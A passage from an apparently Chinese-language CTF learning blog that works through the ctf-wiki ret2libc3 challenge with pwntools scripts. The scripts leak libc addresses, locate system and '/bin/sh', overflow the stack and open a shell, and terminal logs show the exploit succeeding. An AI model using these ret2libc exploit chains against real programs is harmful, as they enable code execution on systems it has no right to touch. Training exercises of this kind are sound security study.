æ‰äº†æ³¨é‡Š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>start = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><br><span class="hljs-comment"># payload = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + puts_got  # æŠ¥é”™ï¼šTypeError: can&#x27;t concat int to bytes</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">108</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(puts_plt) + p32(start) + p32(puts_got) <span class="hljs-comment"># æ­£ç¡®å†™æ³•</span><br>io.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br>puts_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(puts_addr_raw)<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>base = puts_addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>sh_addr = base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # é”™è¯¯å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">108</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(system_addr) + <span class="hljs-string">b&#x27;1234&#x27;</span> + p32(sh_addr) <span class="hljs-comment"># æ­£ç¡®å†™æ³•</span><br>io.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload2)<br>io.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">â””â”€# python exp-clean.py                                                                              </span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 18209</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.37-5_i386</span><br><span class="hljs-string">1 - libc6_2.32-0experimental0_amd64</span><br><span class="hljs-string">2 - libc6_2.37-6_i386</span><br><span class="hljs-string">3 - libc6-amd64_2.32-0experimental0_i386</span><br><span class="hljs-string">4 - libc6-amd64_2.8~20080505-0ubuntu9_i386</span><br><span class="hljs-string">5 - libc6_2.32-0experimental1_amd64</span><br><span class="hljs-string">6 - libc6-amd64_2.32-0experimental1_i386</span><br><span class="hljs-string">7 - libc6_2.8~20080505-0ubuntu9_amd64</span><br><span class="hljs-string">8 - libc6_2.37-7_i386</span><br><span class="hljs-string">[+] Choose one : 0</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$ </span><br><span class="hljs-string">[*] Interrupted</span><br><span class="hljs-string">[*] Stopped process &#x27;./ret2libc3&#x27; (pid 18209)</span><br><span class="hljs-string">                                                                                                                                                                                                                                          </span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">â””â”€# </span><br><span class="hljs-string">                                                                                                                                                                                                                                          </span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">â””â”€# </span><br><span class="hljs-string">       </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831104550.png" alt="image.png"></p><h2 id="exp2ï¼šæ³„éœ²setvbufå‡½æ•°çš„çœŸå®åœ°å€"><a href="#exp2ï¼šæ³„éœ²setvbufå‡½æ•°çš„çœŸå®åœ°å€" class="headerlink" title="exp2ï¼šæ³„éœ²setvbufå‡½æ•°çš„çœŸå®åœ°å€"></a>exp2ï¼šæ³„éœ²setvbufå‡½æ•°çš„çœŸå®åœ°å€</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯¼å…¥ pwntools åº“ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„å¼ºå¤§å·¥å…·åº“ã€‚</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># å¯¼å…¥ LibcSearcherï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºä»å‡½æ•°åœ°å€ä¸­æœç´¢libcç‰ˆæœ¬å’Œæå–libcå‡½æ•°åœ°å€çš„å·¥å…·ã€‚</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œæ‰§è¡Œåä¸º ret2libc3 çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™å°†ç”¨äºåœ¨æœ¬åœ°ç³»ç»Ÿä¸Šæ‰§è¡Œæ¼æ´åˆ©ç”¨ã€‚</span><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><span class="hljs-comment"># å°† ret2libc3 å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ° elf å¯¹è±¡ä¸­ï¼Œä»¥ä¾¿ä»ä¸­è·å–æœ‰å…³ç¨‹åºç»“æ„çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å‡½æ•°åœ°å€å’ŒGOTåœ°å€ã€‚</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== é€šè¿‡æ³„éœ² setvbuf å‡½æ•°çš„åœ°å€ ===&quot;</span>)<br><span class="hljs-comment"># è·å– puts å‡½æ•°çš„ PLTï¼ˆProcedure Linkage Tableï¼‰åœ°å€å’Œ GOTï¼ˆGlobal Offset Tableï¼‰åœ°å€ã€‚</span><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>setvbuf_got = elf.got[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br><span class="hljs-comment"># è·å–ç¨‹åºçš„ _start ç¬¦å·çš„åœ°å€ï¼Œè¿™é€šå¸¸æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span><br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_plt: &quot;</span>, puts_plt)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_got: &quot;</span>, setvbuf_got)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(setvbuf_got): &quot;</span>, <span class="hljs-built_in">hex</span>(setvbuf_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start_addr: &quot;</span>, start_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(start_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(start_addr))<br><span class="hljs-comment"># æ„å»ºä¸€ä¸ª payloadï¼Œå…¶ä¸­åŒ…æ‹¬ 112 ä¸ªå­—èŠ‚çš„å¡«å……ï¼ˆç”¨äºå¡«å……åˆ°è¿”å›åœ°å€ä¹‹å‰ï¼‰ï¼Œç„¶åæ˜¯ puts å‡½æ•°çš„ PLT åœ°å€ã€ç¨‹åºå…¥å£ç‚¹åœ°å€å’Œ setvbuf å‡½æ•°çš„ GOT åœ°å€ã€‚è¿™å°†åœ¨ç¨‹åºä¸­è§¦å‘æ¼æ´ã€‚</span><br>payload1 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,puts_plt,start_addr,setvbuf_got])<br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + setvbuf_got  # æŠ¥é”™ï¼šTypeError: can&#x27;t concat int to bytes</span><br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(puts_plt) + p32(start) + p32(setvbuf_got) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload1: &quot;</span>, payload1)<br><span class="hljs-comment"># å‘é€æ„å»ºå¥½çš„ payload1 åˆ°ç¨‹åºã€‚</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload1)<br><span class="hljs-comment"># æ¥æ”¶ä»ç¨‹åºä¸­æ³„éœ²çš„ puts å‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ã€‚è¿™å°†å¸®åŠ©ç¡®å®šlibcçš„åŸºå€ã€‚</span><br><span class="hljs-comment"># io.recv(4)æ¥å—ç¨‹åºè¿”å›çš„äºŒè¿›åˆ¶ å¤§å°ä¸º4å­—èŠ‚  u32()ä¸ºä¿å­˜ä¸ºæ— ç¬¦å·çš„32ä½</span><br>setvbuf_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>setvbuf_addr = u32(setvbuf_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_addr_raw: &quot;</span>, setvbuf_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setvbuf_addr: &quot;</span>, setvbuf_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(setvbuf_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(setvbuf_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== è®¡ç®—libcçš„åŸºå€ï¼Œç„¶åè·å– system å‡½æ•°åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸²åœ°å€ ===&quot;</span>)<br><span class="hljs-comment"># ä½¿ç”¨ LibcSearcher å·¥å…·ï¼Œæ ¹æ®æ³„éœ²çš„ puts å‡½æ•°åœ°å€æ¥æœç´¢libcåº“å¹¶æå–ç›¸å…³ä¿¡æ¯ã€‚</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;setvbuf&#x27;</span>,setvbuf_addr)<br><span class="hljs-comment"># è®¡ç®—libcçš„åŸºå€ï¼Œè¿™æ˜¯é€šè¿‡ä» puts å‡½æ•°åœ°å€ä¸­å‡å» puts åœ¨libcä¸­çš„åç§»å¾—åˆ°çš„ã€‚</span><br>base = setvbuf_addr-libc.dump(<span class="hljs-string">&#x27;setvbuf&#x27;</span>)<br><span class="hljs-comment"># è®¡ç®— system å‡½æ•°å’Œ /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¿™å°†ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚</span><br>system_addr = base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># æ„å»ºç¬¬äºŒä¸ª payloadï¼Œå…¶ä¸­åŒ…æ‹¬ 112 ä¸ªå­—èŠ‚çš„å¡«å……ï¼Œç„¶åæ˜¯è®¡ç®—å¾—åˆ°çš„ system å‡½æ•°åœ°å€ã€éšæ„çš„è¿”å›åœ°å€ï¼ˆ1234ï¼‰ï¼Œä»¥åŠè®¡ç®—å¾—åˆ°çš„ /bin/sh å­—ç¬¦ä¸²åœ°å€ã€‚</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(base): &quot;</span>, <span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(bin_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(bin_addr))<br>payload2 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,system_addr,<span class="hljs-number">1234</span>,bin_addr])<br><span class="hljs-comment"># ä½¿ç”¨p32å‡½æ•°å°†æ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„4å­—èŠ‚äºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # é”™è¯¯å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;1234&#x27; + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload2: &quot;</span>, payload2)<br><span class="hljs-comment"># å‘é€æ„å»ºå¥½çš„ payload2 åˆ°ç¨‹åºï¼Œè§¦å‘ç¬¬äºŒé˜¶æ®µçš„æ¼æ´åˆ©ç”¨ï¼Œæ—¨åœ¨è·å–ç³»ç»Ÿ Shellã€‚</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload2)<br><span class="hljs-comment"># ä¸ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œè·å–ç³»ç»Ÿ Shellï¼Œè¿›å…¥äº¤äº’å¼å‘½ä»¤æ¨¡å¼ã€‚</span><br>io.interactive()<br><br><span class="hljs-string">&quot;&quot;&quot;                                                            </span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">â””â”€# python exp2.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 21841</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">=== é€šè¿‡æ³„éœ² setvbuf å‡½æ•°çš„åœ°å€ ===</span><br><span class="hljs-string">puts_plt:  134513760</span><br><span class="hljs-string">hex(puts_plt):  0x8048460</span><br><span class="hljs-string">setvbuf_got:  134520872</span><br><span class="hljs-string">hex(setvbuf_got):  0x804a028</span><br><span class="hljs-string">start_addr:  134513872</span><br><span class="hljs-string">hex(start_addr):  0x80484d0</span><br><span class="hljs-string">payload1:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08(\xa0\x04\x08&#x27;</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">setvbuf_addr_raw:  b&#x27;\x80:\xc7\xf7&#x27;</span><br><span class="hljs-string">setvbuf_addr:  4157028992</span><br><span class="hljs-string">hex(setvbuf_addr):  0xf7c73a80</span><br><span class="hljs-string">=== è®¡ç®—libcçš„åŸºå€ï¼Œç„¶åè·å– system å‡½æ•°åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸²åœ°å€ ===</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6-amd64_2.31-0ubuntu9.4_i386</span><br><span class="hljs-string">1 - libc6_2.3.2.ds1-13ubuntu2.3_amd64</span><br><span class="hljs-string">2 - libc6_2.37-5_i386</span><br><span class="hljs-string">3 - libc-2.33.9000-40.fc35.i686</span><br><span class="hljs-string">4 - libc6_2.11.1-0ubuntu7.14_i386</span><br><span class="hljs-string">5 - libc-2.33.9000-42.fc35.i686</span><br><span class="hljs-string">6 - libc6-amd64_2.31-0ubuntu9.5_i386</span><br><span class="hljs-string">7 - libc6_2.3.2.ds1-13ubuntu2.2_amd64</span><br><span class="hljs-string">8 - libc6_2.37-6_i386</span><br><span class="hljs-string">9 - libc-2.33.9000-43.fc35.i686</span><br><span class="hljs-string">[+] Choose one : 2</span><br><span class="hljs-string">hex(base):  0xf7c00000</span><br><span class="hljs-string">hex(system_addr):  0xf7c4c8a0</span><br><span class="hljs-string">hex(bin_addr):  0xf7db5fc8</span><br><span class="hljs-string">payload2:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp33.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831121835.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šä¸ªlibcç‰ˆæœ¬ï¼Œå¯ä»¥1ä¸ª1ä¸ªçš„è¯•(å› ä¸ºç¨‹åºä¸º32ä½çš„ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©æ€§çš„æŠŠ64ä½çš„å»æ‰)<br>å¦å¤–ä¸€ä¸ªåŠæ³•å°±æ˜¯æŸ¥çœ‹libc-databaseï¼Œæ‰¾åˆ°å¯ç”¨çš„libcï¼Œç›´æ¥é€‰æ‹©å¯¹åº”çš„libcåºå·å³å¯</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831122046.png" alt="image.png"></p><h2 id="exp3ï¼šåˆ©ç”¨-libc-start-mainæ³„éœ²"><a href="#exp3ï¼šåˆ©ç”¨-libc-start-mainæ³„éœ²" class="headerlink" title="exp3ï¼šåˆ©ç”¨__libc_start_mainæ³„éœ²"></a>exp3ï¼šåˆ©ç”¨__libc_start_mainæ³„éœ²</h2><p>å®˜æ–¹çš„é¢˜è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</span><br><span class="hljs-string">1ï¼‰æ³„éœ² __libc_start_main åœ°å€</span><br><span class="hljs-string">2ï¼‰è·å– libc ç‰ˆæœ¬</span><br><span class="hljs-string">3ï¼‰è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€</span><br><span class="hljs-string">4ï¼‰å†æ¬¡æ‰§è¡Œæºç¨‹åº</span><br><span class="hljs-string">5ï¼‰è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)</span><br><span class="hljs-string"></span><br><span class="hljs-string">1ï¼‰è¯¦ç»†ä»‹ç»ï¼š</span><br><span class="hljs-string">a. å½“ä½ å°†putså‡½æ•°çš„åœ°å€æ”¾åœ¨æ ˆä¸Šï¼Œç„¶åé€šè¿‡æ§åˆ¶ç¨‹åºæµä½¿å…¶æ‰§è¡Œputså‡½æ•°ï¼Œç¨‹åºä¼šè·³è½¬åˆ°putså‡½æ•°çš„ä»£ç ï¼Œå¼€å§‹æ‰§è¡Œå®ƒã€‚è€Œputså‡½æ•°é€šå¸¸ç”¨äºå°†ä¸€ä¸ªä»¥nullç»“å°¾çš„å­—ç¬¦ä¸²è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆç»ˆç«¯ï¼‰ã€‚</span><br><span class="hljs-string">b. åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å°†__libc_start_mainçš„GOTï¼ˆGlobal Offset Tableï¼Œå…¨å±€åç§»è¡¨ï¼‰åœ°å€ä½œä¸ºå‚æ•°ä¼ é€’ç»™äº†putså‡½æ•°ã€‚è¿™ä¸ªGOTè¡¨æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼ŒåŒ…å«äº†ç¨‹åºä¸­éœ€è¦è°ƒç”¨çš„å¤–éƒ¨åº“å‡½æ•°çš„åœ°å€ã€‚å…¶ä¸­ï¼Œ__libc_start_mainå‡½æ•°åœ¨ç¨‹åºå¯åŠ¨æ—¶è¢«è°ƒç”¨ï¼Œå› æ­¤GOTè¡¨ä¸­å­˜å‚¨äº†å¯¹è¯¥å‡½æ•°çš„å¼•ç”¨ã€‚</span><br><span class="hljs-string">c. å½“putså‡½æ•°è¢«æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šæ ¹æ®ä¼ é€’çš„åœ°å€ä»GOTè¡¨ä¸­è¯»å–æ•°æ®ï¼Œç„¶åå°†è¿™äº›æ•°æ®è¾“å‡ºåˆ°ç»ˆç«¯ã€‚ç”±äºä½ ä¼ é€’çš„æ˜¯__libc_start_mainçš„GOTè¡¨åœ°å€ï¼Œputså‡½æ•°å®é™…ä¸Šä¼šè¾“å‡º__libc_start_mainå‡½æ•°çš„åœ°å€ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><span class="hljs-comment"># context(os=&quot;linux&quot;, log_level=&#x27;debug&#x27;)</span><br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_plt = ret2libc3.plt[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span 